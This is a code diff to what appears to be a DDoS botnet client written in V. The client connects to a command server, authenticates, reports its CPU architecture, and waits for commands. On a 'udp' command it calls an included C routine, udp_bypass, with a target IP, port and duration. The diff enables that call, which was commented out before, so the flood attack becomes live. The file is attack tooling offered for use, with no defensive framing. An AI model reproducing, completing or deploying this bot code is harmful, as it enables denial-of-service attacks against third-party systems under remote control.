@@ -3,9 +3,9 @@ import io
 import net
 import time
 
-#include "@VROOT/methods/udp.c"
+#include "@VROOT/core/methods/udp.c"
 
-fn C.udp_bypass(string, u16, int)
+fn C.udp_bypass(&char, u16, int)
 
 fn main() {
 	mut args := os.args.clone()
@@ -27,25 +27,27 @@ fn server(ip string, port string, pw string) {
 
 	mut reader := io.new_buffered_reader(reader: server)
 	server.write_string("${pw}\n") or { 0 } // Send PW
-	time.sleep(2*time.second)
-	check := reader.read_line() or { "" }
-	if check.replace("\n", "") == "[x]" { exit(0) }
+	time.sleep(1*time.second)
 
 	server.write_string("cpu_here\n") or { 0 } // Send CPU ARCH
 	for {
 		data := reader.read_line() or { "" }
 		fcmd, cmd, args := parse_buffer(data)
-
-		match cmd {
-			"udp" {
-				if args.len < 4 {
-					server.write_stirng("[ + ] Attack being sent....\n") or { 0 }
-					// C.udp_bypass(args[1], args[2], args[3])
-					server.write_stirng("[ + ] Attack Successfully finished....\n") or { 0 }
-				} else {
-					server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
-				}
-			} else {}
+		if data.len > 2 {
+			match cmd {
+				"udp" {
+					if args.len < 4 {
+						println("here")
+						server.write_string("[ + ] Attack being sent....\n") or { 0 }
+						mut g := c'${args[1]}'
+						C.udp_bypass(g, args[2].u16(), args[3].int())
+						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
+					} else {
+						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
+					}
+				} else {}
+			}
+			println("${data}")
 		}
 		
 	}
